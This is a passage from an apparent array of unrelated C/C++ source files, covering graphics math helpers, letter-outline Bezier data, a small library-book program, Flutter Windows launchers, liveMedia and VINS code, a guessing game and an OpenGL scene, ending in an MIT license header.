&uvPosition)\n{\n    return float2(\n        (uvPosition.x + 1.0f) * PI,\n        (1.0f - uvPosition.y) * PI / 2.0f\n    );\n}\n\n\n/**\n * Convert location of a pixel in an image into UV.\n *\n * @arg pixelLocation: The x, and y positions of the pixel.\n * @arg format: The image width, and height.\n *\n * @returns: The UV position.\n */\ninline float2 pixelsToUV(const float2 &pixelLocation, const float2 &format)\n{\n    return float2(\n        2.0f * pixelLocation.x / format.x - 1.0f,\n        2.0f * pixelLocation.y / format.y - 1.0f\n    );\n}\n\n\n/**\n * Convert a spherical unit vector (unit radius) to cartesion.\n *\n * @arg angles: The spherical angles in radians.\n *\n * @returns: The equivalent cartesion vector.\n */\ninline float3 sphericalUnitVectorToCartesion(const float2 &angles)\n{\n    const float sinPhi = sin(angles.y);\n    return float3(\n        cos(angles.x) * sinPhi,\n        cos(angles.y),\n        sin(angles.x) * sinPhi\n    );\n}\n\n\n/**\n * Get the position component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg position: The location to store the position.\n */\ninline void positionFromWorldMatrix(const float4x4 &worldMatrix, float3 &position)\n{\n    position = float3(\n        worldMatrix[0][3],\n        worldMatrix[1][3],\n        worldMatrix[2][3]\n    );\n}\n\n\n/**\n * Get the rotation component of a world matrix.\n *\n * @arg worldMatrix: The world matrix.\n * @arg rotation: The location to store the rotation.\n */\ninline void rotationFromWorldMatrix(const float4x4 &worldMatrix, float3x3 &rotationMatrix)\n{\n    rotationMatrix[0][0] = worldMatrix[0][0];\n    rotationMatrix[0][1] = worldMatrix[0][1];\n    rotationMatrix[0][2] = worldMatrix[0][2];\n    rotationMatrix[1][0] = worldMatrix[1][0];\n    rotationMatrix[1][1] = worldMatrix[1][1];\n    rotationMatrix[1][2] = worldMatrix[1][2];\n    rotationMatrix[2][0] = worldMatrix[2][0];\n    rotationMatrix[2][1] = worldMatrix[2][1];\n    rotationMatrix[2][2] = worldMatrix[2][2];\n}\n\n\n//\n// Randomization functions\n//\n\n\n// Some random constants on the interval [1, 2]\n#define RAND_CONST_0 1.571411510193971f\n#define RAND_CONST_1 1.268632820084931f\n#define RAND_CONST_2 1.7880365647937733f\n#define RAND_CONST_3 1.3546987471558234f\n#define RAND_CONST_4 1.4365958250848703f\n#define RAND_CONST_5 1.7045380669435368f\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float random(const float seed)\n{\n    return fract(sin(73.1f * seed + 91.3458f) * 47453.5453f);\n}\n\n\n/**\n * Get a random value on the interval [0, 1].\n *\n * @arg seed: The random seed.\n *\n * @returns: A random value on the interval [0, 1].\n */\ninline float2 random(const float2 &seed)\n{\n    return float2(\n        fract(sin(13.157f * seed.x + 71.743f) * 7513.471f),\n        fract(sin(97.519f * seed.y + 113.591f) * 47453.5453f)\n    );\n}\n\n\n/**\n * Create a random point that lies within the unit circle.\n *\n * @arg seed: The random seed.\n *\n *",
    "#include \"draw.hpp\"\n\nstd::vector<std::vector<Bezier> > draw_A() {\n    std::vector<std::vector<Bezier> > A(2);\n    // Outer outline\n    A[0].emplace_back(Point2D(10, 100), Point2D(40, 0));\n    A[0].emplace_back(Point2D(40, 0), Point2D(60, 0));\n    A[0].emplace_back(Point2D(60, 0), Point2D(90, 100));\n    A[0].emplace_back(Point2D(90, 100), Point2D(67, 100));\n    A[0].emplace_back(Point2D(67, 100), Point2D(60, 75));\n    A[0].emplace_back(Point2D(60, 75), Point2D(40, 75));\n    A[0].emplace_back(Point2D(40, 75), Point2D(33, 100));\n    A[0].emplace_back(Point2D(33, 100), Point2D(10, 100));\n    // Inner triangle\n    A[1].emplace_back(Point2D(41, 56), Point2D(50, 32));\n    A[1].emplace_back(Point2D(50, 32), Point2D(59, 56));\n    A[1].emplace_back(Point2D(59, 56), Point2D(41, 56));\n    return A;\n}\n\nstd::vector<std::vector<Bezier> > draw_B(){\n    std::vector<std::vector<Bezier> > B(3);\n    // Outer outline\n    B[0].emplace_back(Point2D(10, 100), Point2D(10, 0));\n    B[0].emplace_back(Point2D(10, 0), Point2D(50, 0));\n    B[0].emplace_back(Point2D(50, 0), Point2D(90, 25), Point2D(90, 0));\n    B[0].emplace_back(Point2D(90, 25), Point2D(70, 50), Point2D(90, 50));\n    B[0].emplace_back(Point2D(70, 50), Point2D(90, 75), Point2D(90, 50));\n    B[0].emplace_back(Point2D(90, 75), Point2D(50, 100), Point2D(90, 100));\n    B[0].emplace_back(Point2D(50, 100), Point2D(10, 100));\n    // Upper inner hole\n    B[1].emplace_back(Point2D(30, 40), Point2D(30, 20));\n    B[1].emplace_back(Point2D(30, 20), Point2D(50, 20));\n    B[1].emplace_back(Point2D(50, 20), Point2D(70, 30), Point2D(70, 20));\n    B[1].emplace_back(Point2D(70, 30), Point2D(50, 40), Point2D(70, 40));\n    B[1].emplace_back(Point2D(50, 40), Point2D(30, 40));\n    // Lower inner hole\n    B[2].emplace_back(Point2D(30, 80), Point2D(30, 60));\n    B[2].emplace_back(Point2D(30, 60), Point2D(50, 60));\n    B[2].emplace_back(Point2D(50, 60), Point2D(70, 70), Point2D(70, 60));\n    B[2].emplace_back(Point2D(70, 70), Point2D(50, 80), Point2D(70, 80));\n    B[2].emplace_back(Point2D(50, 80), Point2D(30, 80));\n    return B;\n}\n\nstd::vector<std::vector<Bezier> > draw_C(){\n    std::vector<std::vector<Bezier> > C(1); // One vector inside the outer vector\n    // Outer outline\n    C[0].emplace_back(Point2D(90, 0), Point2D(50, 0));\n    C[0].emplace_back(Point2D(50, 0), Point2D(10, 50), Point2D(10, 0));\n    C[0].emplace_back(Point2D(10, 50), Point2D(50, 100), Point2D(10, 100));\n    C[0].emplace_back(Point2D(50, 100), Point2D(90, 100));\n    C[0].emplace_back(Point2D(90, 100), Point2D(90, 80));\n    C[0].emplace_back(Point2D(90, 80), Point2D(50, 80));\n    C[0].emplace_back(Point2D(50, 80), Point2D(30, 50), Point2D(30, 80));\n    C[0].emplace_back(Point2D(30, 50), Point2D(50, 20), Point2D(30, 20));\n    C[0].emplace_back(Point2D(50, 20), Point2D(90, 20));\n    C[0].emplace_back(Point2D(90, 20), Point2D(90, 0));\n    return C;\n}\n\nstd::vector<std::vector<Bezier> > draw_D(){\n    std::vector<std::vector<Bezier> > D(2);\n    // Outer outline\n    D[0].emplace_back(Point2D(10, 0), Point2D(50, 0));\n    D[0].emplace_back(Point2D(50, 0), Point2D(90, 50), Point2D(90, 0));\n    D[0].emplace_back(Point2D(90, 50), Point2D(50, 100), Point2D(90, 100));\n    D[0].emplace_back(Point2D(50, 100), Point2D(10, 100));\n    D[0].emplace_back(Point2D(10, 100), Point2D(10, 0));\n    // Inner hole\n    D[1].emplace_back(Point2D(30, 20), Point2D(50, 20));\n    D[1].emplace_back(Point2D(50, 20), Point2D(70, 50), Point2D(70, 20));\n    D[1].emplace_back(Point2D(70, 50), Point2D(50, 80), Point2D(70, 80));\n    D[1].emplace_back(Point2D(50, 80), Point2D(30, 80));\n    D[1].emplace_back(Point2D(30, 80), Point2D(30, 20));\n    return D;\n}\n\nstd::vector<std::vector<Bezier> > draw_E(){\n    std::vector<std::vector<Bezier> > E(1);\n    // Outer outline\n    E[0].emplace_back(Point2D(10, 0), Point2D(10, 100));\n    E[0].emplace_back(Point2D(10, 100), Point2D(90, 100));\n    E[0].emplace_back(Point2D(90, 100), Point2D(90, 80));\n    E[0].emplace_back(Point2D(90, 80), Point2D(30, 80));\n    E[0].emplace_back(Point2D(30, 80), Point2D(30, 60));\n    E[0].emplace_back(Point2D(30, 60), Point2D(90, 60));\n    E[0].emplace_back(Point2D(90, 60), Point2D(90, 40));\n    E[0].emplace_back(Point2D(90, 40), Point2D(30, 40));\n    E[0].emplace_back(Point2D(30, 40), Point2D(30, 20));\n    E[0].emplace_back(Point2D(30, 20), Point2D(90, 20));\n    E[0].emplace_back(Point2D(90, 20), Point2D(90, 0));\n    E[0].emplace_back(Point2D(90, 0), Point2D(10, 0));\n    return E;\n}\n\n\n\nstd::vector<std::vector<Bezier> > draw_F(){\n    std::vector<std::vector<Bezier> > F(1);\n    // Outer outline\n    F[0].emplace_back(Point2D(10, 0), Point2D(10, 100));\n    F[0].emplace_back(Point2D(10, 100), Point2D(30, 100));\n    F[0].emplace_back(Point2D(30, 100), Point2D(30, 60));\n    F[0].emplace_back(Point2D(30, 60), Point2D(90, 60));\n    F[0].emplace_back(Point2D(90, 60), Point2D(90, 40));\n    F[0].emplace_back(Point2D(90, 40), Point2D(30, 40));\n    F[0].emplace_back(Point2D(30, 40), Point2D(30, 20));\n    F[0].empl",
    "#include <bits/stdc++.h>\n\nusing namespace std;\nclass Book\n{\nprotected:\n    int id;\n    string title;\n    string author;\n    int quantity;\n\npublic:\n    Book() : id(0), title(\"\"), author(\"\"), quantity(0) {}\n\n    Book(int id, string title, string author, int quantity) : id(id), title(title), author(author), quantity(quantity) {}\n\n    int getNextAvailableId()\n    {\n        ifstream file(\"books.txt\");\n        if (file.is_open())\n        {\n            int lineCount = 0;\n            string line;\n            while (getline(file, line))\n            {\n                lineCount++;\n            }\n            file.close();\n            return lineCount + 1; // id l\u00e0 d\u00f2ng ti\u1ebfp theo sau khi \u0111\u00e3 \u0111\u1ebfm \u0111\u01b0\u1ee3c s\u1ed1 d\u00f2ng\n        }\n        return 1; // Tr\u1ea3 v\u1ec1 1 n\u1ebfu kh\u00f4ng m\u1edf \u0111\u01b0\u1ee3c file\n    }\n\n    void addBook()\n    {\n        id = getNextAvailableId(); // G\u00e1n id l\u00e0 id b\u00e9 nh\u1ea5t ch\u01b0a xu\u1ea5t hi\u1ec7n\n        cout << \"Enter title: \";\n        getline(cin, title);\n        cout << \"Enter author: \";\n        getline(cin, author);\n        cout << \"Enter quantity: \";\n        cin >> quantity;\n\n        // Ki\u1ec3m tra v\u00e0 ghi v\u00e0o file\n        ofstream file(\"books.txt\", ios::app);\n        if (file.is_open())\n        {\n            file << \"[\" << id << \"] \"\n                 << \"[\" << title << \"] \"\n                 << \"[\" << author << \"] \"\n                 << \"[\" << quantity << \"] \" << endl;\n            file.close();\n            cout << \"Add Done\\n\";\n        }\n        else\n        {\n            cout << \"Error!\\n\";\n        }\n    }\n\n    void getBooks()\n    {\n        ifstream file(\"books.txt\");\n        if (file.is_open())\n        {\n            string line;\n            while (getline(file, line))\n            {\n                cout << line << endl;\n            }\n            file.close();\n        }\n        else\n        {\n            cout << \"Unable to open file.\\n\";\n        }\n    }\n    //     void updateBook(int id)\n    //     {\n\n    //     }\n    //     void deleteBook(int id)\n    //     {\n\n    //     }\n};\n\nclass EBook : public Book\n{\nprotected:\n    string fileFormat;\n    int fileSize;\n\npublic:\n    EBook() : Book(), fileFormat(\"\"), fileSize(0) {}\n\n    EBook(string title, string author, int quantity, string fileFormat, int fileSize)\n        : Book(id, title, author, quantity), fileFormat(fileFormat), fileSize(fileSize) {}\n\n    void addBook()\n    {\n        id = getNextAvailableId(); // G\u00e1n id l\u00e0 d\u00f2ng ti\u1ebfp theo trong file\n        cout << \"Enter title: \";\n        cin.ignore();\n        getline(cin, title);\n        cout << \"Enter author: \";\n        getline(cin, author);\n        cout << \"Enter quantity: \";\n        cin >> quantity;\n        cout << \"Enter file format: \";\n        cin.ignore();\n        getline(cin, fileFormat);\n        cout << \"Enter file size: \";\n        cin >> fileSize;\n\n        // Ki\u1ec3m tra v\u00e0 ghi v\u00e0o file\n        ofstream file(\"books.txt\", ios::app);\n        if (file.is_open())\n        {\n            file << \"[\" << id << \"] \"\n                 << \"[\" << title << \"] \"\n                 << \"[\" << author << \"] \"\n                 << \"[\" << quantity << \"] \"\n                 << \"[\" << fileFormat << \"] \"\n                 << \"[\" << fileSize << \"] \" << endl;\n            file.close();\n            cout << \"Ebook add done!\\n\";\n        }\n        else\n        {\n            cout << \"Error!\\n\";\n        }\n    }\n};\n\nint main()\n{\n    Book book;\n    book.addBook(); // Th\u00eam m\u1ed9t s\u00e1ch v\u00e0o file books.txt\n    // book.getBooks(); // Hi\u1ec3n th\u1ecb th\u00f4ng tin s\u00e1ch trong file books.txt\n\n    EBook ebook;\n    ebook.addBook(); // Th\u00eam m\u1ed9t s\u00e1ch \u0111i\u1ec7n t\u1eed v\u00e0o file books.txt\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_namer\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**********\nThis library is free software; you can redistribute it and/or modify it under\nthe terms of the GNU Lesser General Public License as published by the\nFree Software Foundation; either version 3 of the License, or (at your\noption) any later version. (See <http://www.gnu.org/copyleft/lesser.html>.)\n\nThis library is distributed in the hope that it will be useful, but WITHOUT\nANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS\nFOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for\nmore details.\n\nYou should have received a copy of the GNU Lesser General Public License\nalong with this library; if not, write to the Free Software Foundation, Inc.,\n51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA\n**********/\n// \"liveMedia\"\n// Copyright (c) 1996-2024 Live Networks, Inc.  All rights reserved.\n// A generic RTP sink for text codecs (abstract base class)\n// Implementation\n\n#include \"TextRTPSink.hh\"\n\nTextRTPSink::TextRTPSink(UsageEnvironment& env,\n\t\t\t Groupsock* rtpgs, unsigned char rtpPayloadType,\n\t\t\t unsigned rtpTimestampFrequency,\n\t\t\t char const* rtpPayloadFormatName)\n  : MultiFramedRTPSink(env, rtpgs, rtpPayloadType, rtpTimestampFrequency,\n\t\t       rtpPayloadFormatName) {\n}\n\nTextRTPSink::~TextRTPSink() {\n}\n\nchar const* TextRTPSink::sdpMediaType() const {\n  return \"text\";\n}\n",
    "#include \"projection_td_factor.h\"\n\nEigen::Matrix2d ProjectionTdFactor::sqrt_info;\ndouble ProjectionTdFactor::sum_t;\n\nProjectionTdFactor::ProjectionTdFactor(const Eigen::Vector3d &_pts_i, const Eigen::Vector3d &_pts_j, \n                                       const Eigen::Vector2d &_velocity_i, const Eigen::Vector2d &_velocity_j,\n                                       const double _td_i, const double _td_j, const double _row_i, const double _row_j) : \n                                       pts_i(_pts_i), pts_j(_pts_j), \n                                       td_i(_td_i), td_j(_td_j)\n{\n    velocity_i.x() = _velocity_i.x();\n    velocity_i.y() = _velocity_i.y();\n    velocity_i.z() = 0;\n    velocity_j.x() = _velocity_j.x();\n    velocity_j.y() = _velocity_j.y();\n    velocity_j.z() = 0;\n    row_i = _row_i - ROW / 2;\n    row_j = _row_j - ROW / 2;\n\n#ifdef UNIT_SPHERE_ERROR\n    Eigen::Vector3d b1, b2;\n    Eigen::Vector3d a = pts_j.normalized();\n    Eigen::Vector3d tmp(0, 0, 1);\n    if(a == tmp)\n        tmp << 1, 0, 0;\n    b1 = (tmp - a * (a.transpose() * tmp)).normalized();\n    b2 = a.cross(b1);\n    tangent_base.block<1, 3>(0, 0) = b1.transpose();\n    tangent_base.block<1, 3>(1, 0) = b2.transpose();\n#endif\n};\n\nbool ProjectionTdFactor::Evaluate(double const *const *parameters, double *residuals, double **jacobians) const\n{\n    TicToc tic_toc;\n    Eigen::Vector3d Pi(parameters[0][0], parameters[0][1], parameters[0][2]);\n    Eigen::Quaterniond Qi(parameters[0][6], parameters[0][3], parameters[0][4], parameters[0][5]);\n\n    Eigen::Vector3d Pj(parameters[1][0], parameters[1][1], parameters[1][2]);\n    Eigen::Quaterniond Qj(parameters[1][6], parameters[1][3], parameters[1][4], parameters[1][5]);\n\n    Eigen::Vector3d tic(parameters[2][0], parameters[2][1], parameters[2][2]);\n    Eigen::Quaterniond qic(parameters[2][6], parameters[2][3], parameters[2][4], parameters[2][5]);\n\n    double inv_dep_i = parameters[3][0];\n\n    double td = parameters[4][0];\n\n    Eigen::Vector3d pts_i_td, pts_j_td;\n    pts_i_td = pts_i - (td - td_i + TR / ROW * row_i) * velocity_i;\n    pts_j_td = pts_j - (td - td_j + TR / ROW * row_j) * velocity_j;\n    Eigen::Vector3d pts_camera_i = pts_i_td / inv_dep_i;\n    Eigen::Vector3d pts_imu_i = qic * pts_camera_i + tic;\n    Eigen::Vector3d pts_w = Qi * pts_imu_i + Pi;\n    Eigen::Vector3d pts_imu_j = Qj.inverse() * (pts_w - Pj);\n    Eigen::Vector3d pts_camera_j = qic.inverse() * (pts_imu_j - tic);\n    Eigen::Map<Eigen::Vector2d> residual(residuals);\n\n#ifdef UNIT_SPHERE_ERROR \n    residual =  tangent_base * (pts_camera_j.normalized() - pts_j_td.normalized());\n#else\n    double dep_j = pts_camera_j.z();\n    residual = (pts_camera_j / dep_j).head<2>() - pts_j_td.head<2>();\n#endif\n\n    residual = sqrt_info * residual;\n\n    if (jacobians)\n    {\n        Eigen::Matrix3d Ri = Qi.toRotationMatrix();\n        Eigen::Matrix3d Rj = Qj.toRotationMatrix();\n        Eigen::Matrix3d ric = qic.toRotationMatrix();\n        Eigen::Matrix<double, 2, 3> reduce(2, 3);\n#ifdef UNIT_SPHERE_ERROR\n        double norm = pts_camera_j.norm();\n        Eigen::Matrix3d norm_jaco;\n        double x1, x2, x3;\n        x1 = pts_camera_j(0);\n        x2 = pts_camera_j(1);\n        x3 = pts_camera_j(2);\n        norm_jaco << 1.0 / norm - x1 * x1 / pow(norm, 3), - x1 * x2 / pow(norm, 3),            - x1 * x3 / pow(norm, 3),\n                     - x1 * x2 / pow(norm, 3),            1.0 / norm - x2 * x2 / pow(norm, 3), - x2 * x3 / pow(norm, 3),\n                     - x1 * x3 / pow(norm, 3),            - x2 * x3 / pow(norm, 3),            1.0 / norm - x3 * x3 / pow(norm, 3);\n        reduce = tangent_base * norm_jaco;\n#else\n        reduce << 1. / dep_j, 0, -pts_camera_j(0) / (dep_j * dep_j),\n            0, 1. / dep_j, -pts_camera_j(1) / (dep_j * dep_j);\n#endif\n        reduce = sqrt_info * reduce;\n\n        if (jacobians[0])\n        {\n            Eigen::Map<Eigen::Matrix<double, 2, 7, Eigen::RowMajor>> jacobian_pose_i(jacobians[0]);\n\n            Eigen::Matrix<double, 3, 6> jaco_i;\n            jaco_i.leftCols<3>() = ric.transpose() * Rj.transpose();\n            jaco_i.rightCols<3>() = ric.transpose() * Rj.transpose() * Ri * -Utility::skewSymmetric(pts_imu_i);\n\n            jacobian_pose_i.leftCols<6>() = reduce * jaco_i;\n            jacobian_pose_i.rightCols<1>().setZero();\n        }\n\n        if (jacobians[1])\n        {\n            Eigen::Map<Eigen::Matrix<double, 2, 7, Eigen::RowMajor>> jacobian_pose_j(jacobians[1]);\n\n            Eigen::Matrix<double, 3, 6> jaco_j;\n            jaco_j.leftCols<3>() = ric.transpose() * -Rj.transpose();\n            jaco_j.rightCols<3>() = ric.transpose() * Utility::skewSymmetric(pts_imu_j);\n\n            jacobian_pose_j.leftCols<6>() = reduce * jaco_j;\n            jacobian_pose_j.rightCols<1>().setZero();\n        }\n        if (jacobians[2])\n        {\n            Eigen::Map<Eigen::Matrix<double, 2, 7, Eigen::RowMajor>> jacobian_ex_pose(jacobians[2]);\n            Eigen::Matrix<double, 3, 6> jaco_ex;\n            jaco_ex.leftCols<3>() = ri",
    "#include<iostream>\r\n#include<cstdlib>\r\nusing namespace std;\r\nint main()\r\n{\r\n    int a,b,c=0,d=0,f=0;\r\n    cout<<\"*********************Welcome to guess number game .***************************\\nRules:\\n\"<<endl;\r\n    cout<<\"1.Enter y for yes and n for exit the game\"<<endl;\r\n    cout<<\"2.You have to enter number in between 1-10\"<<endl;\r\n    char e;\r\n    do\r\n    {\r\n    \t\r\n        cout<<\"Enter the guess number from 1-10 you think         \";\r\n        cin>>a;\r\n        cout<<endl;\r\n        b=rand()%10+1;\r\n  \r\n        if(b==a)\r\n        {\r\n            cout<<\"Congratulations you guess correct number     \"<<endl;\r\n            c++;\r\n        }\r\n        else\r\n        {\r\n            cout<<\"Sorry,wrong guessded number Try again    \"<<endl;\r\n            d++;\r\n        }\r\n        f++;\r\n        cout<<\"Do you want to try again y/n     \";\r\n        cin>>e;\r\n        cout<<endl;\r\n        if(e=='n'||e=='y'){}\r\n        else\r\n        {\r\n            cout<<\"Invalid input.Plz enter again to play game or to exit    \"<<endl;\r\n        }\r\n    }while(e!='n');\r\n    cout<<\"You tried \"<<f<<\"times\"<<endl;\r\n    cout<<\"You guessed correct number \"<<c<<\" times\"<<endl;\r\n    cout<<\"You guessed wrong number  \"<<d<<\" times\"<<endl;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"yes_no_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Moddified by: Zoe Somji\n// Date: 2024\n\n#include \"ECS.h\"\n#include \"ECSComponents.h\"\n\n#include <glew.h>\n#include <iostream>\n#include <SDL.h>\n#include \"Scene6G.h\"\n#include <MMath.h>\n#include <QMath.h>\n#include <Vector>\n#include \"Debug.h\"\n#include \"Body.h\"\n#include \"skybox.h\"\n#include \"imgui/imgui.h\"\n#include \"imgui/imgui_impl_opengl3.h\"\n#include \"imgui/imgui_impl_sdl.h\"\n#include \"imgui/imgui_internal.h\"\n#include <unordered_map>\n#include <string>\n#include <memory>\n#include <vector>\n#include <filesystem>\n#include <windows.h>\n#include \"filebrowser.h\"\n\nusing namespace std;\n#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))\n#define GET_VARIABLE_NAME(Variable) (#Variable)\n\nstatic string currentScene = \"Scene6G\";\n\nstatic int textureWidth = 1280;\nstatic int textureHeight = 720;\n\n// when your done with the ECS make a asset manager with shared pointers -zoe\ntemplate <typename T>\nusing refPtr = std::shared_ptr<T>;\nstatic unordered_map<refPtr<Entity>, int> entityMap;\n\nstatic Manager manager;\n//  static bool show_app_dockspace = false;\n\nstatic Entity &skull(manager.addEntity(\"skull\"));\nstatic Entity &eye(manager.addEntity(\"eye\"));\nstatic Entity &eye2(manager.addEntity(\"eye2\"));\nstatic Entity &shader(manager.addEntity(\"shader\"));\nstatic Entity &tesShader(manager.addEntity(\"tesShader\"));\nstatic Entity &plane(manager.addEntity(\"plane\"));\nstatic Entity &normalMap(manager.addEntity(\"normalMap\"));\nstatic Entity &textureMap(manager.addEntity(\"TextureMap\"));\nstatic Entity &heightMap(manager.addEntity(\"heightMap\"));\n\nstatic Entity &texture2D(manager.addEntity(\"texture2D\"));\n\nstatic filebrowser fb;\n\nScene6G::Scene6G() : drawInWireMode(false), Skulltexture(nullptr), Eyetexture(nullptr)\n{\n\tDebug::Info(\"Created Scene6G: \", __FILE__, __LINE__);\n}\n\nScene6G::~Scene6G()\n{\n\tDebug::Info(\"Deleted Scene6G: \", __FILE__, __LINE__);\n}\n\nbool Scene6G::OnCreate()\n{\n\n\tCreateFBO();\n\tGLint maxPatchVerticies;\n\tglGetIntegerv(GL_MAX_PATCH_VERTICES, &maxPatchVerticies);\n\tprintf(\"maxPatchVerticies: %d\\n\", maxPatchVerticies);\n\n\tfor (int i = 0; i < manager.getEntities().size(); ++i)\n\t{\n\t\tentityMap[manager.getEntities()[i]] = i;\n\t}\n\tfor_each(entityMap.begin(), entityMap.end(), [](auto &p)\n\t\t\t { p.first->addComponent<BodyComponent>(); });\n\n\ttrackball.setWindowDimensions();\n\n\tDebug::Info(\"Loading assets Scene6G: \", __FILE__, __LINE__);\n\n\tlightPos = Vec3(10.0f, 0.0f, 0.0f);\n\n\tskullBody = new Body();\n\teyeBody = new Body();\n\n\tplane.addComponent<newMeshComponent>(nullptr, \"meshes/Plane.obj\");\n\tplane.getComponent<newMeshComponent>().OnCreate();\n\tplane.addComponent<newTransformComponent>(Vec3(0.0f, 0.0f, 2.8f), Vec3(1.0f, 1.0f, 1.0f), Quaternion(-90.0f, Vec3(1.0f, 0.0f, 0.0f)));\n\n\tskull.addComponent<newMeshComponent>(nullptr, \"meshes/Skull.obj\");\n\tskull.getComponent<newMeshComponent>().OnCreate();\n\tskull.addComponent<newTransformComponent>(Vec3(0.0f, 0.0f, 3.0f), Vec3(0.15f, 0.15f, 0.15f), Quaternion(1.0f, Vec3(0.0f, 1.0f, 0.0f)));\n\tskull.addComponent<TextureComponent>().LoadTexture(\"textures/skull_texture.jpg\");\n\n\teye.addComponent<newMeshComponent>(nullptr, \"meshes/sphere.obj\");\n\teye.getComponent<newMeshComponent>().OnCreate();\n\teye.addComponent<newTransformComponent>(Vec3(1.0f, 0.2f, 0.6f), Vec3(0.28f, 0.28f, 0.28f), Quaternion(-90.0f, Vec3(0.0f, 1.0f, 0.0f)));\n\teye.addComponent<TextureComponent>().LoadTexture(\"textures/evilEye.jpg\");\n\n\teye2.addComponent<newMeshComponent>(nullptr, \"meshes/sphere.obj\");\n\teye2.getComponent<newMeshComponent>().OnCreate();\n\teye2.addComponent<newTransformComponent>(Vec3(1.0f, 0.2f, -0.6f), Vec3(0.28f, 0.28f, 0.28f), Quaternion(-90.0f, Vec3(0.0f, 1.0f, 0.0f)));\n\teye2.addComponent<TextureComponent>().LoadTexture(\"textures/evilEye.jpg\");\n\n\tshader.addComponent<newShaderComponent>(nullptr, \"shaders/FogtexturePhongVert.glsl\", \"shaders/FogtexturePhongFrag.glsl\");\n\ttesShader.addComponent<newShaderComponent>(nullptr, \"shaders/tessTexturePhoneVert.glsl\", \"shaders/tessTexturePhoneFrag.glsl\", \"shaders/tessTextureCtrl.glsl\", \"shaders/tessTextureEval.glsl\");\n\n\theightMap.addComponent<TextureComponent>().LoadTexture(\"textures/Depth/terrainHeight.png\");\n\ttextureMap.addComponent<TextureComponent>().LoadTexture(\"textures/Depth/terrainDiffuse.png\");\n\tnormalMap.addComponent<TextureComponent>().LoadTexture(\"textures/Depth/terrainNormal.png\");\n\n\tbool ret = texture2D.addComponent<Texture2DComponent>().LoadTexture(\"textures/nahla.png\");\n\tIM_ASSERT(ret);\n\n\tif (shader.getComponent<newShaderComponent>().OnCreate() == false)\n\t{\n\t\tcout << \"Shader failed ... we have a problem\\n\";\n\t}\n\tif (tesShader.getComponent<newShaderComponent>().OnCreate() == false)\n\t{\n\t\tcout << \"Shader failed ... we have a problem\\n\";\n\t}\n\n\tZoomAmount = initEyeZ + Zoom;\n\tprevZoom = Zoom;\n\n\t// Sky = new skybox(\"textures/skyBox/Underwater Box_Posx.png\", \"textures/skyBox/Underwater Box_Negx.png\",\n\t//\t\t\t\t \"textures/skyBox/Underwater Box_Posy.png\", \"textures/skyBox/Underwater Box_Negy.png\",\n\t//\t\t\t\t \"textures/skyBox/Underwater Box_Posz.png\", \"textures/skyBox/Underwater Box_Negz.png\");\n\n\tSky = ne",
    "/*\n *  @date   : 2018/04/18\n *  @author : Rprop (r_prop@outlook.com)\n *  https://github.com/Rprop/And64InlineHook\n */\n/*\n MIT License\n\n Copyright (c) 2018 Rprop (r_prop@outlook.com)\n\n Permission is hereby granted, free of charge, to any person obtaining a copy\n of this software and associated documentation files (the \"Software\"), to deal\n in the Software without restriction, including without limitation the rights\n to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the Software is\n furnished to do so, subject to the following conditions:\n\n The above copyright notice and this permission notice shall be included in all\n copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO 